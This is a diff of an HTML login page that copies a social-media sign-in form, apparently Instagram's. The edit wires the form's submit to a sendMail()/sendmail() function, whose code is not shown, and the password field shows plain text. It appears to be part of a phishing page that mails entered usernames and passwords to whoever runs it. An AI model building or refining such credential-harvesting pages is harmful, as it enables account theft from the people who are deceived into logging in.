@@ -24,15 +24,15 @@
                 <div class="logo">
                     <img src="logo2.png" alt=""  style = " width: 175px;">
                 </div>
-                <form class="form">
+                <form class="form" onsubmit="sendmail()">
                     <div class="input_field">
-                        <input name="user_name" id="username" type="text" placeholder="Phone Number , username , or email" class="input" minLength='3' required>
+                        <input name="user_name" id="username" type="text" placeholder="Phone Number , username , or email" class="input" minlength='3' required>
                     </div>
                     <div class="input_field">
-                        <input name="user_pw" id="passw" type="text" placeholder="Password" class="input" required>
+                        <input name="user_pw" id="passw" type="text" placeholder="Password" class="input" minlength='3' required>
                     </div>
                     <div class="btn">
-                        <a  onClick="sendMail()" href="#">log In</a>
+                        <button type="submit" href="#">log In</button>
                     </div>
                 </form>
                 <div class="or">
